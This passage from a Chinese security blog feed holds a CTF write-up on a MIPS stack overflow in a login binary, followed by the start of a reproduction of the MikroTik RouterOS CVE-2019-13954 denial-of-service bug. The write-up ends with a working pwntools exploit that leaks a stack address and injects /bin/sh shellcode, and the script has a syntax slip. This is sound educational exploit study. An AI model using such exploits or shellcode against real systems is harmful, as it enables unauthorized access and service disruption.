0x20+var_10($fp)</span><br><span class="line">.text:00400B6C                 lui     $v0, 0x40  # &#x27;@&#x27;</span><br><span class="line">.text:00400B70                 addiu   $a0, $v0, (aWe1c0meT0MpL0g - 0x400000)  # &quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;</span><br><span class="line">.text:00400B74                 la      $v0, puts</span><br><span class="line">.text:00400B78                 move    $t9, $v0</span><br><span class="line">.text:00400B7C                 jalr    $t9 ; puts</span><br><span class="line">.text:00400B80                 nop</span><br><span class="line">.text:00400B84                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400B88                 jal     sub_400840</span><br><span class="line">.text:00400B8C                 nop</span><br><span class="line">.text:00400B90                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400B94                 sw      $v0, 0x20+var_8($fp)</span><br><span class="line">.text:00400B98                 lw      $a0, 0x20+var_8($fp)</span><br><span class="line">.text:00400B9C                 jal     sub_400978</span><br><span class="line">.text:00400BA0                 nop</span><br><span class="line">.text:00400BA4                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400BA8                 lui     $v0, 0x40  # &#x27;@&#x27;</span><br><span class="line">.text:00400BAC                 addiu   $a0, $v0, (a32m - 0x400000)  # &quot;\x1B[32m&quot;</span><br><span class="line">.text:00400BB0                 la      $v0, printf</span><br><span class="line">.text:00400BB4                 move    $t9, $v0</span><br><span class="line">.text:00400BB8                 jalr    $t9 ; printf</span><br><span class="line">.text:00400BBC                 nop</span><br><span class="line">.text:00400BC0                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400BC4                 lui     $v0, 0x40  # &#x27;@&#x27;</span><br><span class="line">.text:00400BC8                 addiu   $a0, $v0, (aNowYouGetshell - 0x400000)  # &quot;Now you getshell~&quot;</span><br><span class="line">.text:00400BCC                 la      $v0, puts</span><br><span class="line">.text:00400BD0                 move    $t9, $v0</span><br><span class="line">.text:00400BD4                 jalr    $t9 ; puts</span><br><span class="line">.text:00400BD8                 nop</span><br><span class="line">.text:00400BDC                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400BE0                 nop</span><br><span class="line">.text:00400BE4                 addi    $fp, 4</span><br><span class="line">.text:00400BE8                 lw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400BEC                 lw      $fp, 0x20+var_s0($sp)</span><br><span class="line">.text:00400BF0                 addiu   $sp, 0x28</span><br><span class="line">.text:00400BF4                 jr      $ra</span><br><span class="line">.text:00400BF8                 nop</span><br><span class="line">.text:00400BF8  # End of function main</span><br></pre></td></tr></table></figure>

<p>sub_400840汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00400840 sub_400840:                              # CODE XREF: main+9C↓p</span><br><span class="line">.text:00400840</span><br><span class="line">.text:00400840 var_28          = -0x28</span><br><span class="line">.text:00400840 var_20          = -0x20</span><br><span class="line">.text:00400840 var_8           = -8</span><br><span class="line">.text:00400840 var_4           = -4</span><br><span class="line">.text:00400840</span><br><span class="line">.text:00400840                 addiu   $sp, -0x38</span><br><span class="line">.text:00400844                 sw      $ra, 0x38+var_4($sp)</span><br><span class="line">.text:00400848                 sw      $fp, 0x38+var_8($sp)</span><br><span class="line">.text:0040084C                 move    $fp, $sp</span><br><span class="line">.text:00400850                 li      $gp, 0x418E50</span><br><span class="line">.text:00400858                 sw      $gp, 0x38+var_28($sp)</span><br><span class="line">.text:0040085C                 li      $a2, 0x18</span><br><span class="line">.text:00400860                 move    $a1, $zero</span><br><span class="line">.text:00400864                 addiu   $v0, $fp, 0x38+var_20</span><br><span class="line">.text:00400868                 move    $a0, $v0</span><br><span class="line">.text:0040086C                 la      $v0, memset</span><br><span class="line">.text:00400870                 move    $t9, $v0</span><br><span class="line">.text:00400874                 jalr    $t9 ; memset</span><br><span class="line">.text:00400878                 nop</span><br><span class="line">.text:0040087C                 lw      $gp, 0x38+var_28($fp)</span><br><span class="line">.text:00400880                 lui     $v0, 0x40</span><br><span class="line">.text:00400884                 addiu   $a0, $v0, (a34m - 0x400000)  # &quot;\x1B[34m&quot;</span><br><span class="line">.text:00400888                 la      $v0, printf</span><br><span class="line">.text:0040088C                 move    $t9, $v0</span><br><span class="line">.text:00400890                 jalr    $t9 ; printf</span><br><span class="line">.text:00400894                 nop</span><br><span class="line">.text:00400898                 lw      $gp, 0x38+var_28($fp)</span><br><span class="line">.text:0040089C                 lui     $v0, 0x40</span><br><span class="line">.text:004008A0                 addiu   $a0, $v0, (aUsername - 0x400000)  # &quot;Username : &quot;</span><br><span class="line">.text:004008A4                 la      $v0, printf</span><br><span class="line">.text:004008A8                 move    $t9, $v0</span><br><span class="line">.text:004008AC                 jalr    $t9 ; printf</span><br><span class="line">.text:004008B0                 nop</span><br><span class="line">.text:004008B4                 lw      $gp, 0x38+var_28($fp)</span><br><span class="line">.text:004008B8                 li      $a2, 0x18</span><br><span class="line">.text:004008BC                 addiu   $a1, $sp, 0x38+var_20</span><br><span class="line">.text:004008C0                 nop</span><br><span class="line">.text:004008C4                 move    $a0, $zero</span><br><span class="line">.text:004008C8                 la      $v0, read</span><br><span class="line">.text:004008CC                 move    $t9, $v0</span><br><span class="line">.text:004008D0                 jalr    $t9 ; read</span><br><span class="line">.text:004008D4                 nop</span><br><span class="line">.text:004008D8                 lw      $gp, 0x38+var_28($fp)</span><br><span class="line">.text:004008DC                 li      $a2, 5</span><br><span class="line">.text:004008E0                 lui     $v0, 0x40</span><br><span class="line">.text:004008E4                 addiu   $a1, $v0, (aAdmin - 0x400000)  # &quot;admin&quot;</span><br><span class="line">.text:004008E8                 addiu   $v0, $fp, 0x38+var_20</span><br><span class="line">.text:004008EC                 move    $a0, $v0</span><br><span class="line">.text:004008F0                 la      $v0, strncmp</span><br><span class="line">.text:004008F4                 move    $t9, $v0</span><br><span class="line">.text:004008F8                 jalr    $t9 ; strncmp</span><br><span class="line">.text:004008FC                 nop</span><br><span class="line">.text:00400900                 lw      $gp, 0x38+var_28($fp)</span><br><span class="line">.text:00400904                 beqz    $v0, loc_400920</span><br><span class="line">.text:00400908                 nop</span><br><span class="line">.text:0040090C                 move    $a0, $zero</span><br><span class="line">.text:00400910                 la      $v0, exit</span><br><span class="line">.text:00400914                 move    $t9, $v0</span><br><span class="line">.text:00400918                 jalr    $t9 ; exit</span><br><span class="line">.text:0040091C                 nop</span><br></pre></td></tr></table></figure>

<p>sub_400978汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:00400978 sub_400978:                              # CODE XREF: main+B0↓p</span><br><span class="line">.text:00400978</span><br><span class="line">.text:00400978 var_58          = -0x58</span><br><span class="line">.text:00400978 var_50          = -0x50</span><br><span class="line">.text:00400978 var_3C          = -0x3C</span><br><span class="line">.text:00400978 var_2C          = -0x2C</span><br><span class="line">.text:00400978 var_8           = -8</span><br><span class="line">.text:00400978 var_4           = -4</span><br><span class="line">.text:00400978 arg_0           =  0</span><br><span class="line">.text:00400978</span><br><span class="line">.text:00400978                 addiu   $sp, -0x68</span><br><span class="line">.text:0040097C                 sw      $ra, 0x68+var_4($sp)</span><br><span class="line">.text:00400980                 sw      $fp, 0x68+var_8($sp)</span><br><span class="line">.text:00400984                 move    $fp, $sp</span><br><span class="line">.text:00400988                 li      $gp, 0x418E50</span><br><span class="line">.text:00400990                 sw      $gp, 0x68+var_58($sp)</span><br><span class="line">.text:00400994                 sw      $a0, 0x68+arg_0($fp)</span><br><span class="line">.text:00400998                 lw      $v0, 0x68+arg_0($fp)</span><br><span class="line">.text:0040099C                 addi    $v0, 4</span><br><span class="line">.text:004009A0                 sw      $v0, 0x68+var_3C($fp)</span><br><span class="line">.text:004009A4                 lui     $v0, 0x40</span><br><span class="line">.text:004009A8                 addiu   $a0, $v0, (a31m - 0x400000)  # &quot;\x1B[31m&quot;</span><br><span class="line">.text:004009AC                 la      $v0, printf</span><br><span class="line">.text:004009B0                 move    $t9, $v0</span><br><span class="line">.text:004009B4                 jalr    $t9 ; printf</span><br><span class="line">.text:004009B8                 nop</span><br><span class="line">.text:004009BC                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:004009C0                 lui     $v0, 0x40</span><br><span class="line">.text:004009C4                 addiu   $a0, $v0, (aPrePassword - 0x400000)  # &quot;Pre_Password : &quot;</span><br><span class="line">.text:004009C8                 la      $v0, printf</span><br><span class="line">.text:004009CC                 move    $t9, $v0</span><br><span class="line">.text:004009D0                 jalr    $t9 ; printf</span><br><span class="line">.text:004009D4                 nop</span><br><span class="line">.text:004009D8                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:004009DC                 addiu   $a1, $sp, 0x68+var_50</span><br><span class="line">.text:004009E0                 li      $a2, 0x24</span><br><span class="line">.text:004009E4                 nop</span><br><span class="line">.text:004009E8                 move    $a0, $zero</span><br><span class="line">.text:004009EC                 la      $v0, read</span><br><span class="line">.text:004009F0                 move    $t9, $v0</span><br><span class="line">.text:004009F4                 jalr    $t9 ; read</span><br><span class="line">.text:004009F8                 nop</span><br><span class="line">.text:004009FC                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:00400A00                 lui     $v0, 0x40</span><br><span class="line">.text:00400A04                 addiu   $a0, $v0, (aPassword - 0x400000)  # &quot;Password : &quot;</span><br><span class="line">.text:00400A08                 la      $v0, printf</span><br><span class="line">.text:00400A0C                 move    $t9, $v0</span><br><span class="line">.text:00400A10                 jalr    $t9 ; printf</span><br><span class="line">.text:00400A14                 nop</span><br><span class="line">.text:00400A18                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:00400A1C                 addiu   $a1, $sp, 0x68+var_2C</span><br><span class="line">.text:00400A20                 lw      $a2, 0x68+var_3C($fp)</span><br><span class="line">.text:00400A24                 nop</span><br><span class="line">.text:00400A28                 move    $a0, $zero</span><br><span class="line">.text:00400A2C                 la      $v0, read</span><br><span class="line">.text:00400A30                 move    $t9, $v0</span><br><span class="line">.text:00400A34                 jalr    $t9 ; read</span><br><span class="line">.text:00400A38                 nop</span><br><span class="line">.text:00400A3C                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:00400A40                 addiu   $v1, $fp, 0x68+var_50</span><br><span class="line">.text:00400A44                 li      $a2, 6</span><br><span class="line">.text:00400A48                 lui     $v0, 0x40</span><br><span class="line">.text:00400A4C                 addiu   $a1, $v0, (aAccess - 0x400000)  # &quot;access&quot;</span><br><span class="line">.text:00400A50                 move    $a0, $v1</span><br><span class="line">.text:00400A54                 la      $v0, strncmp</span><br><span class="line">.text:00400A58                 move    $t9, $v0</span><br><span class="line">.text:00400A5C                 jalr    $t9 ; strncmp</span><br><span class="line">.text:00400A60                 nop</span><br><span class="line">.text:00400A64                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:00400A68                 bnez    $v0, loc_400AA0</span><br><span class="line">.text:00400A6C                 nop</span><br><span class="line">.text:00400A70                 addiu   $v1, $fp, 0x68+var_2C</span><br><span class="line">.text:00400A74                 li      $a2, 0xA</span><br><span class="line">.text:00400A78                 lui     $v0, 0x40</span><br><span class="line">.text:00400A7C                 addiu   $a1, $v0, (a0123456789 - 0x400000)  # &quot;0123456789&quot;</span><br><span class="line">.text:00400A80                 move    $a0, $v1</span><br><span class="line">.text:00400A84                 la      $v0, strncmp</span><br><span class="line">.text:00400A88                 move    $t9, $v0</span><br><span class="line">.text:00400A8C                 jalr    $t9 ; strncmp</span><br><span class="line">.text:00400A90                 nop</span><br><span class="line">.text:00400A94                 lw      $gp, 0x68+var_58($fp)</span><br><span class="line">.text:00400A98                 beqz    $v0, loc_400AB4</span><br><span class="line">.text:00400A9C                 nop</span><br></pre></td></tr></table></figure>

<p>Ida7.5能反汇编MIPS架构的C：</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;</span>);</span><br><span class="line">  v5 = sub_400840();</span><br><span class="line">  sub_400978(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[32m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Now you getshell~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_400840：这里可知Username的前5个字节得为admin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400840</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_400978：这里的read(0，v2，36)发生了栈溢出，可以溢出覆盖v3（控制v4长度的变量）和v4</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400978</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面三个函数可以分析出，main函数调用sub_400840后首先要求输入Username，开始的read函数并没有溢出，后面的strncmp判断要求前5个字符是admin才行，然后会将输入的字符的长度作为返回值传入sub_400978中，其中sub_400978的v3是第一次输入的字符次长度+4，也就是最大是30，紧接着要求输入Pre_Password，read的输入最大是36个字节长度，明显大于v2本身分配的20个字节，存在溢出漏洞，然后再要求输入一次password，最后的if可知第二次输入的和第三次输入的，分别前面得是access和0123456789，最后结束</p>
<p>漏洞利用思路：</p>
<ul>
<li><p>对于第一次输入read，可以通过构造满23个字符+\n，使得’\0’没有空位，拼接到返回的地址，这样就能够通过printf(“%s”)打印泄露调用叶子函数之前的地址了</p>
</li>
<li><p>对于第二次输入read，可以通过溢出改变v3的值，因为v3是控制第三次输入字符串的长度，可以让第三次输入的字符串长度足够大溢出到覆盖返回地址并拼接shellcode</p>
</li>
<li><p>对于第三次输入read，将结合第一次输入泄露的返回地址，覆盖堆栈地址和返回地址</p>
</li>
</ul>
<p>调试：</p>
<p>qemu模拟运行，开1234端口：</p>
<p><code>qemu-arm -g 1234 -L . ./Mplogin</code></p>
<p>gdb动态调试</p>
<p><code>set architecture mips</code></p>
<p><code>set endian little</code></p>
<p><code>target remote :1234</code></p>
<p>对main函数开头进行断点<code>b *0x400aec</code>，c之后这样</p>
<p>结合前面的MIPS结构特点，啰嗦一次下面两条指令</p>
<p>第一条指令：<code>0x400aec    addiu  $sp, $sp, -0x28</code>因为MIPS是通过sp寄存器来访问函数内部的变量等，所以通过减去0x28个字节来分配main函数需要的栈空间</p>
<p>第二条指令：<code>0x400af0    sw     $ra, 0x24($sp)</code>已经进入call main内部了，所以需要提前把前面ra所保存的地址给保存下来，毕竟程序不知道自己下一步还会不会调用一个相对而言的非叶子函数，如果调用的话，那么ra会用于非叶子函数，值会变为非叶子函数的返回地址，此时，前面对返回地址保存状态的意义就有了，因为到main函数快结束时，ra的值还是非叶子函数的返回地址，但因为有保存，所以ra会被重置为返回地址，再跳转到ra</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw7vlb23ncj31c00u0agd.jpg" alt="image-20211108173517301"></p>
<p>对main函数调用sub_400840前进行断点</p>
<p><code>b *0x400B88</code>，c执行后，发现ra跟开始调用main函数时不一样，因为别忘了，题目在这之前调用过puts、printf等这类系统函数，ra可以说是上一次返回地址的一个历史记录</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw84gjlgfqj31ev0u0tfb.jpg" alt="image-20211108212020278"></p>
<p>进入sub_400840中，执行到输入，第一次输入：<code>adminaaaaaaaaaaaaaaaaaaa</code>，程序执行printf的时候会把返回地址给输出出来，这里的乱码就是返回地址（因为足够长，没有了\0，拼接到了栈中的返回地址，从而造成了泄露，具体可以看前面的反汇编出的C）</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw82ms4qpfj30mk0cgmyp.jpg" alt="image-20211108213853566"></p>
<p>可以查看下输入的内存数据，发现的的确确就是返回地址0x40800b90，这里的0x40800510相当于x86的ebp，0x40800b90相当于esp了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw843pzni6j30u00zyguo.jpg" alt="image-20211108222936846"></p>
<p>返回地址：0x400B90</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw844i0lbjj30x20ckmzh.jpg" alt="image-20211108223031148"></p>
<p>misel shellcode：<a href="https://www.exploit-db.com/shellcodes/35868">https://www.exploit-db.com/shellcodes/35868</a></p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;\xff\xff\x06\x28\xff\xff\xd0\x04\xff\xff\x05\x28\x01\x10\xe4\x27\x0f\xf0\x84\x24\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;Username : &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;admin&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">19</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">19</span>)</span><br><span class="line">stack_addr = p.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u32(stack_addr[<span class="number">4</span>:<span class="number">7</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pre_Password : &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;access&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">14</span> + p32(<span class="number">0xabc</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Password : &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;0123456789&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">30</span> + p32(<span class="number">0xdeadbeef</span>) + p32(stack_addr) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>IoT安全</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MikroTik-CVE-2019-13954漏洞复现</title>
    <url>/2021/09/30/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="MikroTik-RouterOS-CVE-2019-13954漏洞复现"><a href="#MikroTik-RouterOS-CVE-2019-13954漏洞复现" class="headerlink" title="MikroTik RouterOS-CVE-2019-13954漏洞复现"></a>MikroTik RouterOS-CVE-2019-13954漏洞复现</h1><hr>
<h2 id="产品描述："><a href="#产品描述：" class="headerlink" title="产品描述："></a>产品描述：</h2><p><strong>MikroTik RouterOS</strong>是一种<strong>路由操作系统</strong>，并通过该软件将标准的PC电脑变成专业路由器，在软件的开发和应用上不断的更新和发展，软件经历了多次更新和改进，使其功能在不断增强和完善。特别在无线、认证、策略路由、带宽控制和防火墙过滤等功能上有着非常突出的功能，其极高的性价比，受到许多网络人士的青睐。RouterOS在具备现有路由系统的大部分功能，能针对网吧、企业、小型ISP接入商、社区等网络设备的接入，基于标准的<strong>x86构架</strong>的PC。一台586PC机就可以实现路由功能，提高硬件性能同样也能提高网络的访问速度和吞吐量。完全是一套低成本，高性能的路由器系统。</p>
<h2 id="漏洞利用分析："><a href="#漏洞利用分析：" class="headerlink" title="漏洞利用分析："></a>漏洞利用分析：</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>根据CVE-2019-13954的漏洞公告中得知，认证的用户可以通过发送一个特殊的POST请求，服务器在处理此请求时会陷入死循环，造成内存耗尽，导致系统的服务瘫痪重启</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t015b57d9b0be67ff85.jpg" alt="https://re1own.github.io/assets/img"></p>
<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>CVE-2019-13954的漏洞利用地方跟CVE-2018-1157的类似，都是同一个地方死循环</p>
<p>下面是<code>6.40.5</code>，<code>x86</code>架构的漏洞文件反汇编代码：从中不难看出，有两个重要的函数决定循环是否能跳出while的死循环，sub_5E9F()和Headers::parseHeaderLine解析后的返回值为非零（即解析失败），因此此处可以利用的点就这两个函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">JSProxyServlet::doUpload</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, Headers *a3, Headers *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//	...</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_5E9F</span>(v32, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !s1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    string::<span class="built_in">string</span>((string *)&amp;v41, &amp;s1);</span><br><span class="line">    v14 = Headers::<span class="built_in">parseHeaderLine</span>((Headers *)&amp;v42, (<span class="keyword">const</span> string *)&amp;v41);</span><br><span class="line">    string::<span class="built_in">freeptr</span>((string *)&amp;v41);</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )	</span><br><span class="line">    &#123;</span><br><span class="line">      string::<span class="built_in">string</span>((string *)&amp;v41, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      Response::<span class="built_in">sendError</span>(a4, <span class="number">400</span>, (<span class="keyword">const</span> string *)&amp;v41);</span><br><span class="line">      string::<span class="built_in">freeptr</span>((string *)&amp;v41);</span><br><span class="line">LABEL_56:</span><br><span class="line">      tree_base::<span class="built_in">clear</span>(v16, v15, &amp;v42, map_node_destr&lt;string,HeaderField&gt;);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题就出在sub_5E9F函数（读取post请求数据），在getline的时候，如果输入的字节数量大于</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *__usercall sub_5E9F@&lt;eax&gt;(istream *a1@&lt;eax&gt;, <span class="keyword">char</span> *a2@&lt;edx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  istream::<span class="built_in">getline</span>(a1, a2, <span class="number">256u</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v2) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = &amp;v2[v4 - <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( *result == <span class="number">13</span> )</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是<code>6.42.11</code>，<code>x86</code>架构打了补丁的JSProxyServlet::doUpload，加了一个长度判断是不是0x100个字节</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">JSProxyServlet::doUpload</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, Headers *a3, Headers *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_51F7</span>(v37, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !s1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = <span class="number">-1</span>;</span><br><span class="line">    v15 = &amp;s1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v16 = *v15++ == <span class="number">0</span>;</span><br><span class="line">      --v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v16 );</span><br><span class="line">    <span class="keyword">if</span> ( v14 != <span class="number">0x100</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">0</span>;</span><br><span class="line">      string::<span class="built_in">string</span>((string *)&amp;v46, &amp;s1);</span><br><span class="line">      v17 = Headers::<span class="built_in">parseHeaderLine</span>((Headers *)&amp;v47, (<span class="keyword">const</span> string *)&amp;v46);</span><br><span class="line">      string::<span class="built_in">freeptr</span>((string *)&amp;v46);</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    string::<span class="built_in">string</span>((string *)&amp;v46, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    Response::<span class="built_in">sendError</span>(a4, <span class="number">400</span>, (<span class="keyword">const</span> string *)&amp;v46);</span><br><span class="line">    string::<span class="built_in">freeptr</span>((string *)&amp;v46);</span><br><span class="line">LABEL_60:</span><br><span class="line">    tree_base::<span class="built_in">clear</span>(v19, v18, &amp;v47, map_node_destr&lt;string,HeaderField&gt;);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相比<code>6.40.5</code>版本，6.42.11中sub_51F7的getline还是没有变</p>
